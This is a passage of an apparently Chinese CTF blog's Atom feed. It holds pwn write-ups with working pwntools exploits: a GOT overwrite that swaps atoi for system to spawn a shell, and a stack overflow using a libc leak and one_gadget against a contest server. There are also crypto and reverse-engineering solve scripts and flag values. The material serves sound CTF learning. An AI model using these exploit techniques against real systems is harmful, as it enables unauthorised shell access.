p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">add</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List count:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    <span class="comment">#print(p.recvline())</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ow</span><span class="params">(listn,st,ed,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List id:'</span>)</span><br><span class="line">    p.sendline(str(listn))</span><br><span class="line">    p.recvuntil(<span class="string">'Star id:'</span>)</span><br><span class="line">    p.sendline(str(st))</span><br><span class="line">    p.recvuntil(<span class="string">'End id:'</span>)</span><br><span class="line">    p.sendline(str(ed))</span><br><span class="line">    p.recvuntil(<span class="string">'New number:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(li,it)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List id:'</span>)</span><br><span class="line">    p.sendline(str(li))</span><br><span class="line">    p.recvuntil(<span class="string">'Item id:'</span>)</span><br><span class="line">    p.sendline(str(it))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showall</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(li,it,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'List id:'</span>)</span><br><span class="line">    p.sendline(str(li))</span><br><span class="line">    p.recvuntil(<span class="string">'Item id:'</span>)</span><br><span class="line">    p.sendline(str(it))</span><br><span class="line">    p.recvuntil(<span class="string">'New number:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0</span>,<span class="string">'4'</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0</span>,<span class="string">'2'</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">1</span>,<span class="string">'3'</span>)</span><br><span class="line">showall()</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,<span class="string">'111111'</span>)</span><br><span class="line">ow(<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,str(<span class="number">1</span>))</span><br><span class="line">ow(<span class="number">0</span>,<span class="number">4</span>,<span class="number">4</span>,str(e.got[<span class="string">'atoi'</span>]))</span><br><span class="line">show(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Number:'</span>)</span><br><span class="line">addr=int(p.recvline())</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">x=finder(<span class="string">'atoi'</span>,addr)</span><br><span class="line">debug()</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0</span>,str(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;第一次吃到东软的瓜，虽然是大连东软的(老NSUer气抖冷)……</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HTB-cosy_casino-pwn-challenge-wp</title>
    <link href="lexsd6.github.io/2021/12/03/cosy-casino-pwn-challenge-wp/"/>
    <id>lexsd6.github.io/2021/12/03/cosy-casino-pwn-challenge-wp/</id>
    <published>2021-12-03T06:45:50.000Z</published>
    <updated>2021-12-07T05:42:18.847Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="634453b67a2dc9922f2f9067eb2e9faafb242fe779c69d53bfd6369318030d94"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    <category term="HTB" scheme="lexsd6.github.io/categories/CTF/HTB/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2021年春秋杯网络安全联赛秋季赛勇者山峰-WP</title>
    <link href="lexsd6.github.io/2021/11/27/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E7%A7%8B%E5%AD%A3%E8%B5%9B%E5%8B%87%E8%80%85%E5%B1%B1%E5%B3%B0/"/>
    <id>lexsd6.github.io/2021/11/27/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E7%A7%8B%E5%AD%A3%E8%B5%9B%E5%8B%87%E8%80%85%E5%B1%B1%E5%B3%B0/</id>
    <published>2021-11-27T02:08:01.695Z</published>
    <updated>2021-12-01T09:10:35.889Z</updated>
    
    <content type="html"><![CDATA[<p>周末抽空看下了，感觉难度差异太大，涝的涝死旱的旱死，太菜了.( ┬o┬)…<a id="more"></a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h3><p>在<a href="https://www.boxentriq.com/code-breaking/vigenere-cipher" target="_blank" rel="noopener">https://www.boxentriq.com/code-breaking/vigenere-cipher</a> 网站爆破得到为key:asterism</p><p><img src="image-20211127100844149.png" alt="image-20211127100844149"></p><p>解密得到falg。</p><p><img src="image-20211127162758654.png" alt="image-20211127162758654"></p><p>flag为：<code>flag{53d613fc-6c5c-4dd6-b3ce-8bc867c6f648}</code></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="supercall"><a href="#supercall" class="headerlink" title="supercall"></a>supercall</h3><p>简单栈溢出，利用<a href="https://github.com/lexsd6/LibcSearcher_plus" target="_blank" rel="noopener">LibcSearcher</a>通过题目泄露出的<code>_IO_2_1_stdin_</code>的真实地址找到 libc 基地址，用one_gatget  来get shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/11/27 13:39:07</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./supercall'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'123.57.207.81'</span>,<span class="number">16985</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0000000000026796 : pop rdi ; ret</span></span><br><span class="line">stack_addr=int(p.recvuntil(<span class="string">','</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">stdin_addr=int(p.recv(),<span class="number">16</span>)</span><br><span class="line">log.info(hex(stack_addr))</span><br><span class="line">log.info(hex(stdin_addr))</span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'_IO_2_1_stdin_'</span>,stdin_addr,num=<span class="number">9</span>)</span><br><span class="line"><span class="comment">#[-] 9: local-46e93283ff53133360e02a73ae5b5ba375410855 (source from:/mnt/d/filewsl/supercall/libc-2.27.so)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">8</span>+<span class="string">'2'</span>*<span class="number">8</span>+<span class="string">'3'</span>*<span class="number">7</span>)</span><br><span class="line">p.sendline(<span class="string">'\x00'</span>*<span class="number">0x10</span>+<span class="string">'x'</span>*<span class="number">8</span>+p64(x.ogg(num=<span class="number">0</span>)))</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">[-] 0: 0x4f3d5  execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>再在远程<code>cat flag</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[+] you choose gadget: 0x4f3d5</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">supercall</span><br><span class="line">$ cat f*</span><br><span class="line">flag&#123;2f3f3632-6484-4c00-82f3-a63e0d4340d9&#125;$</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h2 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h2><p>发现题目有UPX壳，脱壳后，用ida打开审阅发现一疑似加密flag函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40186F</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">256</span>]; <span class="comment">// [esp+18h] [ebp-910h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst[<span class="number">2048</span>]; <span class="comment">// [esp+118h] [ebp-810h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+918h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+91Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_4021AD(<span class="number">22</span>, <span class="number">18</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, v1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v1[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  sub_4017D2(v1, i);#fun2</span><br><span class="line">  <span class="built_in">memset</span>(Dst, <span class="number">0</span>, <span class="number">0x800</span>u);</span><br><span class="line">  sub_4015F7(v1, Dst, i); #fun1</span><br><span class="line">  sub_4021AD(<span class="number">22</span>, <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; Dst[j]; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Dst[j] != a7g5d5bayTmdlwl[j] )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"不对哦~下次再来吧~"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(asc_405016);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进fun2发现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_4017D2</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+8h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      result = *(<span class="keyword">unsigned</span> __int8 *)(j + a1);</span><br><span class="line">      <span class="keyword">if</span> ( !(_BYTE)result )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a2 % i )</span><br><span class="line">        *(_BYTE *)(j + a1) ^= (_BYTE)i + (_BYTE)j;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(j + a1) ^= (<span class="keyword">unsigned</span> __int8)(j % i) + (_BYTE)j;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是对我们的输入字符串，每一个字符按位置进行与操作。</p><p>fun1是字符串的base64加密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v16 &lt; a3 )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = v13;</span><br><span class="line">  v14 = v13 + <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)(a2 + v3) = Str[((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v16 + a1) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>];</span><br><span class="line">  v11 = <span class="number">16</span> * *(_BYTE *)(v16 + a1) &amp; <span class="number">0x30</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 + <span class="number">1</span> &gt;= a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v14;</span><br><span class="line">    v5 = v14 + <span class="number">1</span>;</span><br><span class="line">    *(_BYTE *)(a2 + v4) = Str[v11];</span><br><span class="line">    *(_BYTE *)(v5 + a2) = <span class="string">'='</span>;</span><br><span class="line">    v6 = v5 + <span class="number">1</span>;</span><br><span class="line">    v13 = v5 + <span class="number">2</span>;</span><br><span class="line">    *(_BYTE *)(v6 + a2) = <span class="string">'='</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = v14;</span><br><span class="line">  v15 = v14 + <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)(a2 + v7) = Str[((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v16 + <span class="number">1</span> + a1) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span> | v11];</span><br><span class="line">  v12 = <span class="number">4</span> * *(_BYTE *)(v16 + <span class="number">1</span> + a1) &amp; <span class="number">0x3C</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 + <span class="number">2</span> &gt;= a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a2 + v15) = Str[v12];</span><br><span class="line">    v8 = v15 + <span class="number">1</span>;</span><br><span class="line">    v13 = v15 + <span class="number">2</span>;</span><br><span class="line">    *(_BYTE *)(v8 + a2) = <span class="string">'='</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a2 + v15) = Str[((<span class="keyword">signed</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int8 *)(v16 + <span class="number">2</span> + a1) &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span> | v12];</span><br><span class="line">  v9 = v15 + <span class="number">1</span>;</span><br><span class="line">  v13 = v15 + <span class="number">2</span>;</span><br><span class="line">  *(_BYTE *)(a2 + v9) = Str[*(_BYTE *)(v16 + <span class="number">2</span> + a1) &amp; <span class="number">0x3F</span>];</span><br><span class="line">  v16 += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但在调试时，发现在fun1之前，有个函数将全局变量str值改动了</p><p>这个函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_401536</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// ST13_1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">strlen</span>(<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v2 / <span class="number">2</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; v2 - i - <span class="number">1</span> &gt; j; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[j] &gt; Str[j + <span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        v0 = Str[j];</span><br><span class="line">        Str[j] = Str[j + <span class="number">1</span>];</span><br><span class="line">        Str[j + <span class="number">1</span>] = v0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  dword_406060 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是写脚本还愿str：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">base_flag=[]</span><br><span class="line"><span class="comment">#x='7G5d5bAy+TMdLWlu5CdkMTlcJnwkNUgb2AQL3CcmPpVf6DAp72scOSlb'</span></span><br><span class="line">x=<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line">v2 = len(<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">for ( i = 0; v2 / 2 &gt; i; ++i )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    for ( j = 0; v2 - i - 1 &gt; j; ++j )</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      if ( Str[j] &gt; Str[j + 1] )</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">        v0 = Str[j];</span></span><br><span class="line"><span class="string">        Str[j] = Str[j + 1];</span></span><br><span class="line"><span class="string">        Str[j + 1] = v0;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    base_flag.append(ord(i))</span><br><span class="line">print(base_flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(v2//<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(v2-i<span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">if</span> base_flag[j]&gt;base_flag[j+<span class="number">1</span>]:</span><br><span class="line">            v0=base_flag[j]</span><br><span class="line">            base_flag[j]=base_flag[j+<span class="number">1</span>]</span><br><span class="line">            base_flag[j+<span class="number">1</span>]=v0</span><br></pre></td></tr></table></figure><p>得到真正的str：<code>ABCDEFGHIJKLMNOPQRST0123456789+/UVWXYZabcdefghijklmnopqrstuvwxyz</code></p><p>在对fun1函数和fun2函数逆向换源，得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">table = <span class="string">'ABCDEFGHIJKLMNOPQRST0123456789+/UVWXYZabcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">table2 = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"></span><br><span class="line">tmp = <span class="string">'7G5d5bAy+TMdLWlu5CdkMTlcJnwkNUgb2AQL3CcmPpVf6DAp72scOSlb'</span></span><br><span class="line">tmp2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">index = table.index(i)</span><br><span class="line">tmp2 += table2[index]</span><br><span class="line"></span><br><span class="line">k=base64.b64decode(tmp2+<span class="string">'=='</span>)</span><br><span class="line">nre=<span class="string">''</span></span><br><span class="line">kk=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(k)):</span><br><span class="line">    kk.append(ord(k[i]))</span><br><span class="line"></span><br><span class="line">print(kk)</span><br><span class="line">a2=len(kk)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range((<span class="number">10</span>)):</span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(kk)):</span><br><span class="line"></span><br><span class="line">        print(str(a2%i)+<span class="string">''</span>+str(i))</span><br><span class="line">        <span class="keyword">if</span> a2%i!=<span class="number">0</span>:</span><br><span class="line">            kk[j]^=(i+j)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            kk[j]^=((j%i)+j)</span><br><span class="line">    print(kk)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(k)</span></span><br><span class="line">print(kk)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (kk):</span><br><span class="line">    flag+=chr(i)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h3><p>填完表就有flag</p><p><img src="image-20211127162357150.png" alt="image-20211127162357150"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;周末抽空看下了，感觉难度差异太大，涝的涝死旱的旱死，太菜了.( ┬o┬)…</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Large bin Attack for Glibc 2.31 学习</title>
    <link href="lexsd6.github.io/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/"/>
